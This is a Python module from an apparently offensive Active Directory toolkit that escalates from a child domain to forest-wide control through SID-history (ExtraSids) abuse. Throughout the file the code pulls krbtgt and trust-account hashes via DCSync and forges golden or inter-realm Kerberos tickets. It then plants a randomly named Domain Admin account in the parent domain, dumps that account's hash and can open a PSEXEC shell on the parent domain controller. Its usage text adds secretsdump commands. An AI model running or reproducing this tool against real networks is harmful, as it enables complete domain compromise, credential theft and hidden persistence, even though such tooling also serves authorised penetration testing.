"""
trustkit.attacks.bad_child
~~~~~~~~~~~~~~~~~~~~~~~~~~
Child-to-Parent intra-forest domain privilege escalation via ExtraSids.

Wraps the patched RAISECHILD class (fixed for Windows Server 2022+) with
the trustfull CLI interface.

Two techniques:
  --golden    Golden ticket + ExtraSids via child krbtgt (default raiseChild path)
  --trust-key Inter-realm ticket + ExtraSids via trust account key (more reliable)

Usage:
  trustfull badChild child.domain.local/administrator -hashes :NTHASH
  trustfull badChild child.domain.local/administrator -hashes :NTHASH --golden -target-exec PARENT_DC
"""

import sys
import logging
import argparse

# RAISECHILD is bundled directly — no external file dependency
def _load_raisechild():
    from trustkit.attacks import _raisechild as mod
    return mod


BANNER = r"""
  _               _  _____ _     _ _     _ 
 | |__   __ _  __| |/ ____| |__ (_) | __| |
 | '_ \ / _` |/ _` | |    | '_ \| | |/ _` |
 | |_) | (_| | (_| | |____| | | | | | (_| |
 |_.__/ \__,_|\__,_|\_____|_| |_|_|_|\__,_|

 Child -> Parent Intra-Forest Escalation
 trustfull by plur1bu5
"""

TECHNIQUES = {
    '--trust-key': 'Inter-realm ticket + ExtraSids via trust account key (more reliable on modern Windows)',
    '--golden':    'Golden ticket + ExtraSids via child krbtgt hash (classic raiseChild path)',
}


def build_parser():
    parser = argparse.ArgumentParser(
        prog='trustfull badChild',
        description='badChild: Child-to-Parent intra-forest domain escalation via ExtraSids',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Techniques:
  --trust-key   Inter-realm ticket via trust account key (default, most reliable)
  --golden      Golden ticket via child krbtgt hash

Authentication:
  Supports password, NTLM hashes, AES keys, and Kerberos ccache.

Examples:
  # Trust key path (default) — auto-discovers everything
  trustfull badChild child.domain.local/administrator -hashes :NTHASH

  # With password
  trustfull badChild child.domain.local/administrator -p 'P@ssw0rd'

  # With AES key
  trustfull badChild child.domain.local/administrator -aesKey AESHEX

  # Using existing Kerberos ticket (ccache)
  trustfull badChild child.domain.local/administrator -k -no-pass

  # Golden ticket path
  trustfull badChild child.domain.local/administrator -hashes :NTHASH --golden

  # Execute on parent DC after compromise
  trustfull badChild child.domain.local/administrator -hashes :NTHASH -target-exec PARENT_DC_IP

  # Save ticket to ccache for later use
  trustfull badChild child.domain.local/administrator -hashes :NTHASH -w /tmp/ea.ccache

  # Then use the saved ticket
  export KRB5CCNAME=/tmp/ea.ccache
  impacket-secretsdump -k -no-pass parent.domain.local/administrator@DC1.parent.domain.local

External tools required for --trust-key:
  impacket-ticketer, impacket-getST, bloodyAD
  Install: pip install impacket bloodyad
"""
    )

    parser.add_argument('target', help='domain/username (e.g. child.domain.local/administrator)')

    technique = parser.add_argument_group('technique (default: --trust-key)')
    mode = technique.add_mutually_exclusive_group()
    mode.add_argument('--trust-key', action='store_true',
                      help='Inter-realm ticket + ExtraSids via trust account key (more reliable on modern Windows)')
    mode.add_argument('--golden', action='store_true',
                      help='Golden ticket + ExtraSids via child krbtgt hash')
    parser.add_argument('--techniques', action='store_true',
                        help='List available techniques and exit')

    auth = parser.add_argument_group('authentication')
    auth.add_argument('-p', '-password', metavar='PASSWORD', dest='password', default='',
                      help='Password')
    auth.add_argument('-hashes', metavar='LMHASH:NTHASH',
                      help='NTLM hashes (use :NTHASH if no LM hash)')
    auth.add_argument('-aesKey', metavar='HEX',
                      help='AES128 or AES256 key (hex)')
    auth.add_argument('-k', action='store_true',
                      help='Use Kerberos authentication (reads from KRB5CCNAME)')
    auth.add_argument('-no-pass', action='store_true',
                      help='Do not prompt for password')

    output = parser.add_argument_group('output / targeting')
    output.add_argument('-target-exec', metavar='IP/HOST',
                        help='PSEXEC on this host after parent domain compromise')
    output.add_argument('-targetRID', metavar='RID', default='500',
                        help='RID of target user to impersonate (default: 500 = Administrator)')
    output.add_argument('-w', metavar='PATH',
                        help='Save ticket to ccache file')
    output.add_argument('-dc-ip', metavar='IP',
                        help='Child DC IP (auto-resolved from domain if omitted)')
    output.add_argument('-debug', action='store_true', help='Debug output')
    output.add_argument('-ts', action='store_true', help='Prepend timestamps to output')

    return parser


def main():
    print(BANNER)
    parser = build_parser()

    if len(sys.argv) > 1 and sys.argv[1] == '--techniques':
        print('Techniques for badChild:\n')
        for flag, desc in TECHNIQUES.items():
            print('  %-12s %s' % (flag, desc))
        print()
        sys.exit(0)

    args = parser.parse_args()

    if args.techniques:
        print('Techniques for badChild:\n')
        for flag, desc in TECHNIQUES.items():
            print('  %-12s %s' % (flag, desc))
        print()
        sys.exit(0)

    if not args.golden and not args.trust_key:
        parser.error('Specify a technique: --golden or --trust-key')

    if args.golden:
        args.trust_key = False

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='[%(asctime)s] %(message)s' if args.ts else '%(message)s'
    )

    if not args.hashes and not args.aesKey and not args.k and not args.no_pass and not args.password:
        parser.error('Provide one of: -p PASSWORD, -hashes LMHASH:NTHASH, -aesKey HEX, -k, -no-pass')

    # Parse domain/username from target
    domain, username = args.target.split('/', 1)

    # Build options object compatible with RAISECHILD.__init__
    class Options:
        pass

    opts = Options()
    opts.hashes     = args.hashes
    opts.aesKey     = args.aesKey
    opts.k          = args.k
    opts.w          = args.w
    opts.targetRID  = args.targetRID
    opts.target     = args.target_exec
    opts.ts         = args.ts
    opts.debug      = args.debug

    try:
        rc_mod = _load_raisechild()
        commands = 'cmd.exe'

        if args.trust_key and not args.golden:
            # Trust key path: use our custom exploit flow
            _run_trust_key(args, domain, username, opts, rc_mod)
        else:
            # Golden ticket path: use patched RAISECHILD (stops after dumping creds, no PSEXEC)
            opts.target = None  # no PSEXEC — we only dump creds
            pacifier = rc_mod.RAISECHILD(None, username, args.password or '', domain, opts, '')
            child_name, forest_name = pacifier.getChildInfo(pacifier._RAISECHILD__creds)
            logging.info('[*] Raising %s to %s' % (child_name, forest_name))

            # Auto-fetch user AES key if only hash provided (handles Protected Users)
            if not opts.aesKey and opts.hashes:
                try:
                    logging.info('[*] DCSync\'ing user AES key (fallback for Protected Users)')
                    _, user_creds = pacifier.getCredentials(username, child_name, pacifier._RAISECHILD__creds)
                    if user_creds.get('aesKey'):
                        pacifier._RAISECHILD__creds['aesKey'] = user_creds['aesKey'].decode()
                        logging.info('[*] Got user AES key')
                except Exception:
                    pass
            import io, contextlib
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                target_creds, tgt, tgs = pacifier.raiseUp(child_name, pacifier._RAISECHILD__creds, forest_name)
            # Print credential lines cleanly
            for line in buf.getvalue().splitlines():
                if line.strip():
                    logging.info(line)
            if opts.w:
                from impacket.krb5.ccache import CCache
                ccache = CCache()
                ccache.fromTGT(tgt['KDC_REP'], tgt['oldSessionKey'], tgt['sessionKey'])
                ccache.saveFile(opts.w)
                logging.info('[+] Ticket saved to %s' % opts.w)

    except Exception as e:
        logging.error('[-] %s' % e)

        # Suggest the other technique if this one failed
        if args.golden:
            logging.error('[!] --golden failed. Try --trust-key which bypasses golden ticket')
            logging.error('    validation entirely and works on modern Windows even with broken krbtgt.')
        elif args.trust_key:
            logging.error('[!] --trust-key failed. Try --golden if the environment has a healthy krbtgt.')
            if 'ticketer' in str(e).lower() or 'bloodyad' in str(e).lower() or 'No such file' in str(e):
                logging.error('[!] Missing external tool. Install: pip install impacket bloodyad')

        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)


def _run_trust_key(args, domain, username, opts, rc_mod):
    """
    Trust key path using RAISECHILD's discovery/DCSync infrastructure.

    Differences from --golden:
      - DCSync the trust account (AD103$/DEMACIA$) instead of krbtgt
      - Forge inter-realm ticket signed with trust key
      - Present directly to parent KDC (no golden ticket involved)
    """
    from binascii import unhexlify, hexlify
    from socket import gethostbyname
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, KerberosError
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.ccache import CCache
    from impacket.dcerpc.v5.samr import NULL

    password = args.password or ''
    lmhash = b''
    nthash = b''
    aes_key = args.aesKey

    if args.hashes:
        lm, nt = args.hashes.split(':')
        lmhash = unhexlify(lm) if lm else b''
        nthash = unhexlify(nt) if nt else b''

    creds = {
        'username': username, 'password': password, 'domain': domain,
        'lmhash': lmhash, 'nthash': nthash, 'aesKey': aes_key,
        'TGT': None, 'TGS': None,
    }

    # Use RAISECHILD for all discovery and DCSync
    pacifier = rc_mod.RAISECHILD(args.target_exec, username, password, domain, opts, 'cmd.exe')

    logging.info('[*] Raising child domain %s' % domain)
    child_name, forest_name = pacifier.getChildInfo(creds)
    logging.info('[*] Forest FQDN: %s' % forest_name)
    logging.info('[*] Raising %s to %s' % (child_name, forest_name))

    parent_sid, target_name = pacifier.getParentSidAndTargetName(forest_name, creds, opts.targetRID)
    logging.info('[*] %s Enterprise Admin SID: %s-519' % (forest_name, parent_sid))
    extra_sid = parent_sid + '-519'

    # DCSync krbtgt to get child domain credentials (needed for ticket structure)
    logging.info('[*] Getting krbtgt credentials for %s' % child_name)
    _, krbtgt_creds = pacifier.getCredentials('krbtgt', child_name, creds)
    krbtgt_nt  = krbtgt_creds['nthash'].decode()
    krbtgt_aes = krbtgt_creds['aesKey'].decode() if krbtgt_creds['aesKey'] else None
    logging.info('%s/krbtgt::%s:%s:::' % (child_name, krbtgt_creds['lmhash'].decode(), krbtgt_nt))
    if krbtgt_aes:
        logging.info('%s/krbtgt:aes256-cts-hmac-sha1-96:%s' % (child_name, krbtgt_aes))

    # Find and DCSync the trust account
    logging.info('[*] Looking for trust account in %s' % child_name)
    trust_creds = _get_trust_account_creds(pacifier, child_name, creds)
    trust_nt  = trust_creds['nthash'].decode()
    trust_aes = trust_creds['aesKey'].decode() if trust_creds.get('aesKey') else None
    logging.info('[*] Trust account: %s  rc4:%s' % (trust_creds['account'], trust_nt))

    # Get real TGT from child KDC (for ticket structure)
    # If only hash provided, also DCSync user's AES key as fallback (handles Protected Users)
    kdc_host = gethostbyname(child_name)
    principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    if not aes_key and nthash:
        try:
            logging.info('[*] DCSync\'ing user AES key (fallback for Protected Users)')
            _, user_creds = pacifier.getCredentials(username, child_name, creds)
            if user_creds.get('aesKey'):
                aes_key = user_creds['aesKey'].decode()
                logging.info('[*] Got user AES key')
        except Exception:
            pass  # not critical, RC4 will be tried first

    attempts = []
    if aes_key:   attempts.append((aes_key, b'', b''))
    if nthash:    attempts.append((None, lmhash, nthash))

    tgt = cipher = old_sk = sk = None
    for aes, lm, nt in attempts:
        try:
            tgt, cipher, old_sk, sk = getKerberosTGT(principal, password, child_name, lm, nt, aes, kdc_host)
            break
        except KerberosError as e:
            if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value,
                                    constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
                continue
            raise
    if tgt is None:
        raise Exception('Could not obtain TGT')
    logging.info('[+] TGT obtained (etype %d)' % cipher.enctype)

    # Forge inter-realm ticket + get service ticket via subprocesses
    logging.info('[*] Forging inter-realm ticket with trust key')
    import os, tempfile

    child_sid = _get_domain_sid(pacifier, child_name, creds)
    logging.info('[*] Child domain SID: %s' % child_sid)

    parent_dc = gethostbyname(forest_name)
    parent_dc_name = pacifier.getMachineName(str(parent_dc)) + '.' + forest_name
    exec_spn  = 'cifs/%s' % (args.target_exec or parent_dc_name)
    ldap_spn  = 'ldap/%s/%s' % (parent_dc_name, forest_name)
    out_ccache = opts.w or tempfile.mktemp(suffix='.ccache')
    ldap_ccache = tempfile.mktemp(suffix='_ldap.ccache')

    # Get CIFS ticket (for exec / output)
    _run_trust_key_ticket(
        username, child_name, child_sid, extra_sid,
        trust_nt, trust_aes, forest_name, str(parent_dc),
        exec_spn, out_ccache
    )

    # Get LDAP ticket (for DCSync)
    _run_trust_key_ticket(
        username, child_name, child_sid, extra_sid,
        trust_nt, trust_aes, forest_name, str(parent_dc),
        ldap_spn, ldap_ccache
    )
    logging.info('[+] Service ticket obtained')
    logging.info('[*] Use: export KRB5CCNAME=%s' % out_ccache)
    # DCSync parent domain using the LDAP service ticket
    import os, subprocess
    os.environ['KRB5CCNAME'] = ldap_ccache
    parent_dc_name = pacifier.getMachineName(str(parent_dc)) + '.' + forest_name

    logging.info('[*] Getting credentials for %s' % forest_name)
    import random, string
    tmp_user = 'svc-' + ''.join(random.choices(string.ascii_lowercase, k=6))
    # Alphanumeric only — no special chars that break shell quoting
    tmp_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + 'Aa1'
    os.environ['KRB5CCNAME'] = ldap_ccache

    r_add = subprocess.run([
        'bloodyAD', '-u', username, '-k',
        '--host', parent_dc_name, '-d', forest_name,
        'add', 'user', tmp_user, tmp_pass
    ], capture_output=True, text=True, env=os.environ)

    r_grp = subprocess.run([
        'bloodyAD', '-u', username, '-k',
        '--host', parent_dc_name, '-d', forest_name,
        'add', 'groupMember', 'Domain Admins', tmp_user
    ], capture_output=True, text=True, env=os.environ)

    if '[+]' in r_add.stdout and '[+]' in r_grp.stdout:
        # Get the NTLM hash — don't expose the plaintext password
        r_ds = subprocess.run([
            'impacket-secretsdump',
            '-just-dc-user', tmp_user,
            '%s/%s:%s@%s' % (forest_name, tmp_user, tmp_pass, parent_dc_name)
        ], capture_output=True, text=True)

        tmp_hash = None
        for line in r_ds.stdout.splitlines():
            if tmp_user.lower() in line.lower() and ':::' in line:
                tmp_hash = line.split(':')[3]  # NT hash
                break

        if tmp_hash:
            logging.info('[+] Temporary Domain Admin created: %s' % tmp_user)
            logging.info('[+] NT hash: %s' % tmp_hash)
            logging.info('[*] Use:')
            logging.info('    nxc smb %s -u %s -H %s' % (parent_dc_name, tmp_user, tmp_hash))
            logging.info('    impacket-secretsdump %s/%s@%s -hashes :%s' % (
                forest_name, tmp_user, parent_dc_name, tmp_hash))
        else:
            logging.info('[+] Temporary Domain Admin created: %s' % tmp_user)
            logging.info('[*] DCSync parent domain:')
            for line in r_ds.stdout.splitlines():
                if ':::' in line or 'aes256' in line.lower():
                    logging.info(line)

        logging.info('[!] Clean up: bloodyAD ... remove groupMember "Domain Admins" %s && bloodyAD ... remove object %s' % (tmp_user, tmp_user))
    else:
        logging.warning('[-] Could not create temp user')
        logging.info('[*] Ticket saved — use manually:')
        logging.info('    export KRB5CCNAME=%s' % ldap_ccache)

    # Clean up ldap ccache (internal use only)
    try:
        import os as _os
        _os.unlink(ldap_ccache)
    except Exception:
        pass

    if args.target_exec:
        logging.info('[*] Opening PSEXEC shell at %s' % args.target_exec)
        os.environ['KRB5CCNAME'] = out_ccache
        subprocess.run([
            'impacket-psexec',
            '-k', '-no-pass',
            '%s/%s@%s' % (forest_name, username, args.target_exec)
        ], env=os.environ)


def _get_domain_sid(pacifier, domain: str, creds: dict) -> str:
    """Get domain SID via LSARPC."""
    sid, _ = pacifier.getParentSidAndTargetName(domain, creds, '500')
    return sid


def _run_trust_key_ticket(username, child_domain, child_sid, extra_sid,
                           trust_nt, trust_aes, parent_domain, parent_dc_ip,
                           spn, out_ccache):
    """
    Forge inter-realm ticket and get service ticket using subprocesses.
    Replicates exactly what worked manually:
      impacket-ticketer -nthash TRUST_NT -domain-sid CHILD_SID -domain CHILD
                        -extra-sid EA_SID -spn krbtgt/PARENT -dc-ip PARENT_DC user
      export KRB5CCNAME=user.ccache
      impacket-getST -k -no-pass -spn SPN -dc-ip PARENT_DC PARENT/user
    """
    import os, tempfile, subprocess, shutil

    # Check required external tools upfront
    for tool in ['impacket-ticketer', 'impacket-getST', 'bloodyAD']:
        if not shutil.which(tool):
            raise Exception(
                'Required tool not found: %s\n'
                '    Install with: pip install impacket bloodyad' % tool
            )

    workdir = tempfile.mkdtemp()
    tgt_ccache = os.path.join(workdir, '%s.ccache' % username)

    # Step 1: forge inter-realm ticket
    cmd = ['impacket-ticketer',
           '-nthash', trust_nt,
           '-domain-sid', child_sid,
           '-domain', child_domain,
           '-extra-sid', extra_sid,
           '-spn', 'krbtgt/%s' % parent_domain,
           '-dc-ip', parent_dc_ip,
           username]

    env = os.environ.copy()
    env['KRB5CCNAME'] = tgt_ccache
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=workdir, env=env)
    logging.debug('ticketer stdout: %s' % r.stdout)
    logging.debug('ticketer stderr: %s' % r.stderr)

    # ticketer writes to <username>.ccache in cwd
    written = os.path.join(workdir, '%s.ccache' % username)
    if not os.path.exists(written):
        raise Exception('ticketer failed:\n%s' % r.stderr)

    env['KRB5CCNAME'] = written

    # Step 2: getST to exchange for service ticket
    cmd2 = ['impacket-getST',
            '-k', '-no-pass',
            '-spn', spn,
            '-dc-ip', parent_dc_ip,
            '%s/%s' % (parent_domain, username)]

    r2 = subprocess.run(cmd2, capture_output=True, text=True, cwd=workdir, env=env)
    logging.debug('getST stdout: %s' % r2.stdout)
    logging.debug('getST stderr: %s' % r2.stderr)

    # getST writes to <username>@<spn_sanitized>@<REALM>.ccache
    st_files = [f for f in os.listdir(workdir) if f.endswith('.ccache') and f != '%s.ccache' % username]
    if not st_files:
        raise Exception('getST failed:\n%s\n%s' % (r2.stdout, r2.stderr))

    st_ccache = os.path.join(workdir, st_files[0])
    shutil.copy(st_ccache, out_ccache)
    shutil.rmtree(workdir, ignore_errors=True)
    logging.info('[+] Service ticket saved to %s' % out_ccache)
    return out_ccache


def _get_trust_account_creds(pacifier, child_domain: str, creds: dict) -> dict:
    """
    Find the inter-domain trust account by enumerating machine accounts
    that end with '$' and have a matching trustedDomain object, then DCSync it.
    """
    from impacket.ldap import ldap as impacket_ldap
    from socket import gethostbyname

    host = gethostbyname(child_domain)
    base_dn = ','.join(['DC=%s' % x for x in child_domain.split('.')])

    ldap_conn = impacket_ldap.LDAPConnection('ldap://%s' % host, child_domain)
    ldap_conn.login(creds['username'], creds['password'], creds['domain'],
                    creds['lmhash'].hex() if isinstance(creds['lmhash'], bytes) else creds['lmhash'],
                    creds['nthash'].hex() if isinstance(creds['nthash'], bytes) else creds['nthash'])

    trust_accounts = []
    for entry in ldap_conn.search(
        searchBase='CN=System,%s' % base_dn,
        searchFilter='(objectClass=trustedDomain)',
        attributes=['flatName']
    ):
        try:
            for attr in entry['attributes']:
                if str(attr['type']) == 'flatName':
                    flat_name = str(attr['vals'][0])
                    trust_accounts.append(flat_name + '$')
        except Exception:
            pass

    ldap_conn.close()

    if not trust_accounts:
        raise Exception('No trustedDomain objects found — cannot get trust key')

    for account in trust_accounts:
        try:
            logging.info('[*] DCSync\'ing trust account: %s' % account)
            _, trust_creds = pacifier.getCredentials(account, child_domain, creds)
            trust_creds['account'] = account
            return trust_creds
        except Exception as e:
            logging.warning('[-] Could not DCSync %s: %s' % (account, e))

    raise Exception('Could not retrieve trust account credentials')


if __name__ == '__main__':
    main()
